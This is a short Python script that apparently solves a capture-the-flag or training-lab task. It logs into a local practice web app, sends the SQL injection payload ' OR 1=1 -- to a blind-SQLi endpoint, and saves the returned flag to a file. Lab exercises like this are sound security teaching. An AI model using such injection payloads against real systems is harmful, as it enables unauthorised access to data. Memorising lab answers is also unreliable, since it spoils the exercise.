import requests
import re

BASE_URL = "http://localhost:5000"
LOGIN_URL = f"{BASE_URL}/login"
SQLI_BLIND_URL = f"{BASE_URL}/sqli/blind"

s = requests.Session()
s.post(LOGIN_URL, data={'roll_no': 'SEC23001', 'password': 'compass123'})

# Task 03: SQLi Blind
# Payload: ' OR 1=1 --
payload = "' OR 1=1 --"

print("Sending payload...")
r = s.get(SQLI_BLIND_URL, params={'guess': payload})

if "ACCESS GRANTED" in r.text:
    print("Success! Access Granted.")
    # Find all strings looking like a flag
    matches = re.findall(r'FLAG\{[^}]+\}', r.text)
    
    real_flag = None
    for m in matches:
        if m != "FLAG{...}":  
            real_flag = m
            break
            
    if real_flag:
        print(f"Flag found: {real_flag}")
        with open("task03_flag.txt", "w") as f:
            f.write(real_flag)
    else:
        print("Flag not found (only placeholder found?).")
        print(f"All matches: {matches}")
else:
    print("Failed. Access Denied.")
